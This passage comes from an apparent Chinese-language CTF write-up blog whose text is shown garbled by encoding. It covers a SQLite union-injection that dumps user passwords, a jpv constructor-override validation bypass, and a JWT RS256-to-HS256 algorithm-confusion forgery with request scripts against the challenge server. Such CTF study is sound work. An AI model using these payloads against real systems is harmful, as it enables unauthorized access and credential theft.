last):</span><br><span class="line">  File &quot;unionflaggenerator.py&quot;, line 49, in do_GET</span><br><span class="line">    cursor.execute(&quot;SELECT id, name, email FROM users WHERE id&#x3D;&quot; + params[&quot;id&quot;])</span><br><span class="line">sqlite3.OperationalError: near &quot;â€˜&quot;: syntax error</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ•°æ®åº“é‡‡ç”¨çš„æ˜¯ sqlite3ã€‚å°è¯•æ„é€ è¯­å¥è¯»å– sqlite_master é‡Œçš„ sql ä»¥å¾—å‡ºæ•°æ®åº“ä¸­è¡¨çš„ç»“æ„ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%20union%20select%201,group_concat(sql),3%20from%20sqlite_master--+</span><br></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°å¦‚ä¸‹å›æ˜¾ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, email TEXT, password TEXT),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)</span><br></pre></td></tr></table></figure><p>äºæ˜¯æ ¹æ®é¢˜ç›®æè¿°ï¼Œå°è¯•è¯»å–è¡¨ä¸­çš„å¯†ç å­—æ®µï¼Œå³ users è¡¨ä¸‹çš„ passwordã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%20union%20select%201,group_concat(password),3%20from%20users--+</span><br></pre></td></tr></table></figure><p>å¾—åˆ°å¦‚ä¸‹å›æ˜¾ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;uni0n_4ll_s3l3ct_n0t_4_n00b&#125;,RightBehindU,diamond69_hands420,winter2020,peter1,password,ilikesex</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;uni0n_4ll_s3l3ct_n0t_4_n00b&#125;</span><br></pre></td></tr></table></figure><h3 id="Cr0wnAir"><a href="#Cr0wnAir" class="headerlink" title="Cr0wnAir"></a>Cr0wnAir</h3><blockquote><p>Cr0wn is getting into the airline business to make some sweet profits when everyone is able to travel again. Can you upgrade your trip?</p></blockquote><blockquote><p>é¢˜ç›®é™„ä»¶ï¼š <a href="https://1drv.ms/u/s!Aqe9Z34waQq1kx1op6yCo_i43ijL?e=VmOaeh">https://1drv.ms/u/s!Aqe9Z34waQq1kx1op6yCo_i43ijL?e=VmOaeh</a></p></blockquote><p>é™„ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œå¯ä»¥å‘ç°æ˜¯ nodejs çš„é¡¹ç›®ã€‚é¦–å…ˆçœ‹ä¸€ä¸‹é¡¹ç›®çš„ package.jsonã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;cr0wnAir&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;app.js&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;start&quot;</span>: <span class="string">&quot;node app.js&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;test&quot;</span>: <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;hyperreality&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;4.17.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;jpv&quot;</span>: <span class="string">&quot;2.0.1&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;jwt-simple&quot;</span>: <span class="string">&quot;0.5.2&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>npm audit</code> å¯ä»¥å‘ç°æŠ¥å‡ºçš„ä¸€ä¸ª jwt-simple çš„é«˜å±æ¼æ´ï¼Œæ ¹æ®<a href="https://www.npmjs.com/advisories/831">æè¿°</a>ï¼Œå®ƒå…è®¸æˆ‘ä»¬ä½¿ç”¨ HS256 ç®—æ³•çš„ token å»ä»£æ›¿ RS256 ç®—æ³•çš„ token æˆåŠŸè§£ç ã€‚åŒæ—¶å¯ä»¥å‘ç° jpv ä½¿ç”¨çš„æ˜¯è›®è€çš„åŒ…ã€‚åœ¨ Synk å¯ä»¥æŸ¥åˆ°è¿™ä¸ªç‰ˆæœ¬çš„<a href="https://snyk.io/vuln/SNYK-JS-JPV-536466">ä¸€ä¸ªé«˜å±æ¼æ´</a>ã€‚å®šä½åˆ° <a href="https://github.com/manvel-khnkoyan/jpv/issues/6">Issue</a> å¯ä»¥å‘ç°ç›¸å…³çš„ PoC ä½œç”¨äº <code>jpv.validate</code> æ–¹æ³•ä¸Šã€‚å†™ä¸€æ®µä»£ç å¤ç°è¿™ä¸ªæ¼æ´ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jpv = <span class="built_in">require</span>(<span class="string">&quot;jpv&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> inputA = &#123;</span><br><span class="line">a: &#123;<span class="string">&quot;nothing&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Lemon&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> inputB = &#123;</span><br><span class="line">a: &#123;<span class="string">&quot;nothing&quot;</span>: <span class="string">&quot;test&quot;</span>, <span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> pattern = &#123;</span><br><span class="line">a: []</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(jpv.validate(inputA, pattern))</span><br><span class="line"><span class="built_in">console</span>.log(jpv.validate(inputB, pattern))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœå¦‚ä¸‹å›¾ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/temporaryButter/1614010796900/c69eb4f63ecc9ca11ca3da90eef2fef1632493c7.png"></p><p>è¿™è¯´æ˜æˆ‘ä»¬æ„é€ çš„è¾“å…¥è¦†ç›–äº† constructor æœ€ç»ˆå½±å“åˆ°äº† jpv çš„åˆ¤æ–­ã€‚æ¥ä¸‹æ¥å…·ä½“çœ‹çœ‹é™„ä»¶ç»™çš„ä»£ç ã€‚</p><p>åœ¨ checkin.js çš„ç¬¬ 45 è¡Œå¯ä»¥å‘ç°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&quot;</span>, <span class="string">&quot;token&quot;</span>: token&#125;;</span><br></pre></td></tr></table></figure><p>26 è¡Œå¤„å¯ä»¥æ‰¾åˆ°è¿™é¢˜ JWT çš„åŠ å¯†æ–¹å¼ RS256ã€‚å¦‚æœéœ€è¦ä¼ªé€  JWT åˆ™å¿…é¡»æƒ³åŠæ³•å…ˆæ‹¿åˆ° keyã€‚è¿™é‡Œå¯ä»¥ä½¿ç”¨ <a href="https://github.com/silentsignal/rsa_sign2n">rsa_sig2n</a> é€šè¿‡ token å»ç®—å‡º keyï¼Œå› æ­¤è‡³å°‘è¦æ‹¿åˆ°ä¸¤ä¸ªå¯ç”¨çš„ tokenã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> jwt.encode(body, config.privkey, <span class="string">&#x27;RS256&#x27;</span>);</span><br></pre></td></tr></table></figure><p>37 è¡Œå¤„å¯ä»¥å‘ç°å®ƒä½¿ç”¨åˆ°äº†ä¸Šè¿°é«˜å±æ¼æ´æ‰€å½±å“çš„æ–¹æ³•ï¼Œé¦–å…ˆå°†è¿™ä¸€éƒ¨åˆ†åˆ¤æ–­çš„ä»£ç æ‘˜å‡ºæ¥ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (jpv.validate(data, pattern, &#123; <span class="attr">debug</span>: <span class="literal">true</span>, <span class="attr">mode</span>: <span class="string">&quot;strict&quot;</span> &#125;)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (data[<span class="string">&quot;firstName&quot;</span>] == <span class="string">&quot;Tony&quot;</span> &amp;&amp; data[<span class="string">&quot;lastName&quot;</span>] == <span class="string">&quot;Abbott&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in! Please remember not to post your boarding pass on social media.&quot;</span>&#125;;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data[<span class="string">&quot;ffp&quot;</span>]) &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer.&quot;</span>&#125;;</span><br><span class="line">      <span class="keyword">for</span>(e <span class="keyword">in</span> data[<span class="string">&quot;extras&quot;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (data[<span class="string">&quot;extras&quot;</span>][e][<span class="string">&quot;sssr&quot;</span>] &amp;&amp; data[<span class="string">&quot;extras&quot;</span>][e][<span class="string">&quot;sssr&quot;</span>] === <span class="string">&quot;FQTU&quot;</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> token = createToken(data[<span class="string">&quot;passport&quot;</span>], data[<span class="string">&quot;ffp&quot;</span>]);</span><br><span class="line">          <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in. Thank you for being a Cr0wnAir frequent flyer. Your loyalty has been rewarded and you have been marked for an upgrade, please visit the upgrades portal.&quot;</span>, <span class="string">&quot;token&quot;</span>: token&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You have successfully checked in!&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;Invalid checkin data provided, please try again.&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°åœ¨è¾¾æˆéƒ¨åˆ†æ¡ä»¶åå¯ä»¥æ‹¿åˆ°å¯ç”¨çš„ tokenã€‚ä½†æ˜¯ä¸æ­¤åŒæ—¶ï¼Œè¿™ä¸ªæ¡ä»¶æ˜¯çœ‹ä¼¼ä¸å¯è¾¾çš„ï¼Œå› ä¸ºæœ‰å¦‚ä¸‹çš„éªŒè¯æœºåˆ¶ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> pattern = &#123;</span><br><span class="line">  firstName: <span class="regexp">/^\w&#123;1,30&#125;$/</span>,</span><br><span class="line">  lastName: <span class="regexp">/^\w&#123;1,30&#125;$/</span>,</span><br><span class="line">  passport: <span class="regexp">/^[0-9]&#123;9&#125;$/</span>,</span><br><span class="line">  ffp: <span class="regexp">/^(|CA[0-9]&#123;8&#125;)$/</span>,</span><br><span class="line">  extras: [</span><br><span class="line">    &#123;<span class="attr">sssr</span>: <span class="regexp">/^(BULK|UMNR|VGML)$/</span>&#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æ­¤æ—¶çš„ FQTU æ˜¯ä¸å¯èƒ½ç¬¦åˆè¿™ä¸ª pattern çš„å­—ç¬¦ä¸²ã€‚æ­¤æ—¶å°±éœ€è¦ä½¿ç”¨ä¸Šé¢çš„æ¼æ´æ¥æ„é€  payloadã€‚é€šè¿‡è§‚å¯Ÿå¯çŸ¥è¿™é‡Œçš„ <code>extras</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œå…ˆæŒ‰ç…§åŸæœ‰ç»“æ„æ„é€ ä¸€ä¸‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">extras: [</span><br><span class="line">&#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;</span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å®ƒæ˜¯æ²¡æ³•é€šè¿‡æ£€æŸ¥çš„ï¼Œä½†æ˜¯å½“å®ƒå˜æˆå¦‚ä¸‹çš„æ ·å­ï¼Œå°±å¯ä»¥é€šè¿‡è¿™ä¸ªæ£€æŸ¥äº†ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">extras: &#123;</span><br><span class="line"><span class="string">&quot;e&quot;</span>: &#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;, </span><br><span class="line"><span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶æ„é€ çš„è¿™ä¸ª payload ç¬¦åˆäº†åˆ¤æ–­ä¸­çš„æ‰€æœ‰æ¡ä»¶ï¼Œå°†å…¶æ”¾åˆ°è¯·æ±‚ä¸­å‘é€å‡ºå»å¯ä»¥å¾—åˆ°æœ‰æ•ˆçš„ tokenã€‚è¿™é‡Œå†™ä¸ªè„šæœ¬è·å–ä¸€ä¸‹ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = &#123;</span><br><span class="line">firstName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">lastName: <span class="string">&quot;Lemon&quot;</span>,</span><br><span class="line">passport: <span class="string">&quot;123456789&quot;</span>,</span><br><span class="line">ffp: <span class="string">&quot;CA12345678&quot;</span>,</span><br><span class="line">extras: &#123;</span><br><span class="line"><span class="string">&quot;e&quot;</span>: &#123;<span class="string">&quot;sssr&quot;</span>: <span class="string">&quot;FQTU&quot;</span>&#125;, </span><br><span class="line"><span class="string">&quot;constructor&quot;</span>: &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;Array&quot;</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">axios.post(<span class="string">&quot;http://34.105.202.19:3000/checkin&quot;</span>, data).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(res[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;token&quot;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>æ›´æ¢ä¸€ä¸‹å¯å˜çš„å‚æ•°åè¯·æ±‚ä¸¤æ¬¡å¯ä»¥å¾—åˆ°å¦‚ä¸‹ä¸¤ä¸ªæœ‰æ•ˆçš„ tokenã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc4In0.IQMSxgcZTmvVNJl51Xe71AtJI6vlINPb0GRy9GmxiLx6WsyFhSs-VXJh8G40TIYSD8LHfQGGxQVoK9Mnn8ImOz0Nv8BROkZ4fNiPEGXEIVaYNR2mzHc4_dARuciASyEdBapLrhlr7ln_EG6vKltB-KgsCfhJErVUOyvwfaZ0HdzJ6CQrS5-go33E7MpVe9LEsP7ySkbTdDxNsLmU64H2NqnWAxckQdEXlO2kMRWzsiCbvwOLY_hlEI2VwMuIqnFChI4McxBsCmel-mo7U6SEjfNyD7sEm3IglfGhW-RGsaR2xI4QuTsnjTRek51k2E-LC3W21AiWZ87jPbpwAXlCKg</span><br><span class="line"></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJicm9uemUiLCJmZnAiOiJDQTEyMzQ1Njc2In0.B86GaaGsm7i1sbszIdebYCzleDwLO6CI3ZaM21wl4-dkN0wAOz8Y3U5r8ukwrA8SV0Mtm23wsTFzaem5BTUbxtw949IUdweaZHJ1IrV1oJKxtY5XrFmim9Od6UrAmG9MhArEG6FRGsXzHbJkcP3cnMWiKPvt71U26VYpYeuZ2dmhufKGh_sYycFN1BZWWsfTK9cbXAw8dMSSFUlrmFxedA-uUkKw-n3Bged_fBBLzeB55WYKa_bX99l1I5S7F4hh4GaU44_thXeQA7VmxNIvRFusKdg7z7zcf3MA981JB1Pjgb2jMQdS7ktMyrP6VhZrJMcQ2EWKv65MpzCj-fB-Ag</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸Šé¢æåˆ°çš„ rsa_sig2n å·¥å…·å¯ä»¥å¾—åˆ°å¦‚ä¸‹å…¬é’¥ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw5lfZkrAzBjl2uf2bF4q</span><br><span class="line">uWzPbmEzcsjVGwEePrj3tQh2gQWMw7HOvNNqVMWbuyK0VYWyk&#x2F;EJ2IXkrV+R7yz1</span><br><span class="line">ROFf2gMH6MRcdVakQF0MQJVRGOmwAIxi+Y7X3fo8HsjJVzzEk4Xy+nWTGS&#x2F;FuNSW</span><br><span class="line">+n0ch81nlZykurVcDKTS7zxPjOtkOswfypoqZyEJ8Uyn32VgWcZ1IK4CB1m9Za0j</span><br><span class="line">DLU30ohyT3e3GUWT+qkUSiaHtMTViq8CxSMzlfFC1ASmAT1wGE+&#x2F;rcUtTPvVKmh0</span><br><span class="line">fTO2sqEsCQp2MGzKk8K1IhwdvuaXqgOFGIcBbaqMwKjpXIfTJSIb7rwEy&#x2F;i3N9y8</span><br><span class="line">CwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>è‡³æ­¤æˆåŠŸæ‹¿åˆ°äº†é¢˜ç›®ç¼–ç  JWT æ‰€ç”¨çš„å…¬é’¥ã€‚ç»§ç»­å®¡è®¡ä»£ç ï¼Œå¯ä»¥åœ¨ upgrades.js ä¸‹å‘ç°å¦‚ä¸‹ä»£ç ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/flag&#x27;</span>, [getLoyaltyStatus], <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (res.locals.token &amp;&amp; res.locals.token.status == <span class="string">&quot;gold&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: config.flag &#125;;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> response = &#123;<span class="attr">msg</span>: <span class="string">&quot;You do not qualify for this upgrade at this time. Please fly with us more.&quot;</span>&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  res.json(response);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶åªéœ€è¦ä¼ªé€ ä¸€æ®µ JWT ä½¿å…¶ status æ»¡è¶³è¦æ±‚å³å¯ã€‚è¿™é‡Œä½¿ç”¨æ—§ç‰ˆçš„åŒ… <code>pyjwt==0.4.3</code> å»ç”Ÿæˆä¸€ä¸ª HS256 ç®—æ³•çš„ tokenã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">key = <span class="built_in">open</span>(<span class="string">&quot;c3995f664ac0cc18_65537_x509.pem&quot;</span>).read()</span><br><span class="line">token = jwt.encode(&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;gold&quot;</span>&#125;, key, <span class="string">&quot;HS256&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure><p>å†ç”¨ axios å»è¯·æ±‚ï¼Œå¯å¾—åˆ° flagã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&quot;axios&quot;</span>)</span><br><span class="line"></span><br><span class="line">axios(&#123;</span><br><span class="line">method: <span class="string">&quot;post&quot;</span>,</span><br><span class="line">url: <span class="string">&quot;http://34.105.202.19:3000/upgrades/flag&quot;</span>,</span><br><span class="line">headers: &#123;</span><br><span class="line"><span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdGF0dXMiOiJnb2xkIn0.aMSl9yfOJoNV3Xzd0vZqhTRgxNrII_iXt6k5w6P1g3E&quot;</span></span><br><span class="line">&#125;&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(res[<span class="string">&quot;data&quot;</span>])</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union&#123;I_&lt;3_JS0N_4nD_th1ngs_wr4pp3d_in_JS0N&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>TrollCAT CTF 2021</title>
      <link href="/zh-CN/posts/447b0fce.html"/>
      <url>/zh-CN/posts/447b0fce.html</url>
      
        <content type="html"><![CDATA[<h3 id="Change-my-mind"><a href="#Change-my-mind" class="headerlink" title="Change my mind"></a>Change my mind</h3><p>ä½¿ç”¨ Stegsolve è§£éšå†™å¯ä»¥å‘ç° flagã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613563863021/7963be2c84c2e5d040bb334d072467b10646e2f8.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;I_L0v3_Tr011C4t&#125;</span><br></pre></td></tr></table></figure><h3 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h3><p>é™„ä»¶ç»™å‡ºäº†ä¸€ä¸ª .car æ–‡ä»¶ã€‚ä½¿ç”¨ binwalk å¯çŸ¥å…¶ä¸­åŒ…å« bzip2 çš„å‹ç¼©æ•°æ®ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613564353680/66a1b77dc9f33188a9a70607578db36f7de97ca0.png" alt="image-20210217201913451"></p><p>æ¥ç€å°è¯•ä½¿ç”¨ <code>binwalk -e</code> å°†æ–‡ä»¶åˆ†ç¦»å‡ºæ¥ã€‚åˆ†ç¦»å‡ºæ¥åå‘ç°ç›´æ¥å¾—åˆ°äº† flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Trollcat&#123;M0zilla_Archive_maaaarls&#125;</span><br></pre></td></tr></table></figure><h3 id="Granny-wants-you"><a href="#Granny-wants-you" class="headerlink" title="Granny wants you"></a>Granny wants you</h3><blockquote><p>Help my granny login, while monitoring my network one day I was able to capture the credentials, go through this file to get ther credentials</p><p>Flag format : username:password ( no â€“ {} ) </p><p>Author: dboidembla</p></blockquote><p>è¿™é¢˜ç»™çš„æµé‡åŒ…ä¸­æœ‰ 300+ ä¸ª TCP æµï¼Œå› æ­¤é¢˜ç›®æè¿°ä¸­çš„ login å’Œ credentials å¾ˆé‡è¦ã€‚ç»“åˆé¢˜ç›®æè¿°å¯çŸ¥è¦æ‰¾çš„æ˜¯ç™»å½•å‡­è¯ã€‚æ—¢ç„¶æ˜¯ç™»å½•é‚£åº”è¯¥æ˜¯ POST è¯·æ±‚ã€‚ç­›é€‰å‡º POST è¯·æ±‚åå¯åœ¨å…¶ä¸­ä¸€ä¸ªé‡Œæ‰¾åˆ°å¦‚ä¸‹ä¿¡æ¯ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/5f081ba4-4e00-4898-92f5-4143dc319d6d/1613565891442/ddc17478d73642825b5cc2a738b748f7a1de1d04.png"></p><p>å°†å…¶ä¸­çš„ä¿¡æ¯æ‘˜å–ä¸‹æ¥ã€‚</p><figure class="highlight 